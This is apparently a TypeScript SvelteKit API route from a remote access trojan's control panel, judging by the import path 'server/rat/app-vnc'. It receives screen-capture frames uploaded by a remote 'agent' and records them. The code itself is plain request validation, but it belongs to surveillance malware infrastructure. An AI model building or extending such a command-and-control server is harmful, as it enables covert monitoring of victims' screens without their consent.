import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { appVncManager, AppVncError } from '$lib/server/rat/app-vnc';
import type { AppVncFramePacket, AppVncFrameIngestResponse } from '$lib/types/app-vnc';

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: AppVncFramePacket;
	try {
		payload = (await request.json()) as AppVncFramePacket;
	} catch {
		throw error(400, 'Invalid frame payload');
	}

	if (!payload || typeof payload.sessionId !== 'string') {
		throw error(400, 'Frame session identifier is required');
	}

	try {
		appVncManager.ingestFrame(id, payload);
	} catch (err) {
		if (err instanceof AppVncError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to record app VNC frame');
	}

	return json({ accepted: true } satisfies AppVncFrameIngestResponse);
};
